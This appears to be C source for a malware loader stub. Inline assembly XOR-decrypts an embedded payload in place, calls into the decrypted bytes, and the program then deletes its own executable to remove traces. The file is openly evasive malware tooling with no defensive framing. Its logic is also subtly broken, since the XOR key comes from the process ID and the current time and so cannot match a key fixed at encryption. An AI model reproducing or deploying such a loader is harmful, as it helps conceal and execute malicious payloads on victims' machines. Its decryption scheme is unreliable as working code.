#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include "payload.h"

//runtime xor key based on pid and time
#define XOR_KEY_BASE (getpid() ^ time(NULL)) 

int main(int argc, char *argv[]) {
    asm volatile (
        "pushl %%ebp\n\t" // save base pointer
        "movl %%esp, %%ebp\n\t" // set up new stack frame

        "movl %0, %%eax\n\t" // eax = payload_size
        "movl %1, %%esi\n\t" // esi = encrypted_payload pointer
        "movl %2, %%ebx\n\t" // ebx = xor key
        "xorl %%ecx, %%ecx\n\t" // ecx = loop counter (0)

        "1:\n\t" // start loop
        "cmpl %%eax, %%ecx\n\t" // compare ecx to payload_size
        "jge 2f\n\t" // if ecx >= payload_size, exit loop

        "movb (%%esi, %%ecx, 1), %%dl\n\t" // dl = encrypted byte
        "xorb %%bl, %%dl\n\t" // xor with key
        "movb %%dl, (%%esi, %%ecx, 1)\n\t" // write decrypted byte back
        "incl %%ecx\n\t" // ecx++
        "jmp 1b\n\t" // loop

        "2:\n\t" // payload is fully decrypted
        "movl %%esi, %%eax\n\t" // eax = pointer to payload
        "call *%%eax\n\t" // jump to decrypted payload as function

        "movl %%ebp, %%esp\n\t" // clean up stack frame
        "popl %%ebp\n\t" // restore base pointer
        :
        : "r" (payload_size), "r" (encrypted_payload), "r" (XOR_KEY_BASE)
        : "eax", "ebx", "ecx", "edx", "esi"
    );

    unlink(argv[0]); // self-delete after running payload
    return 0;
}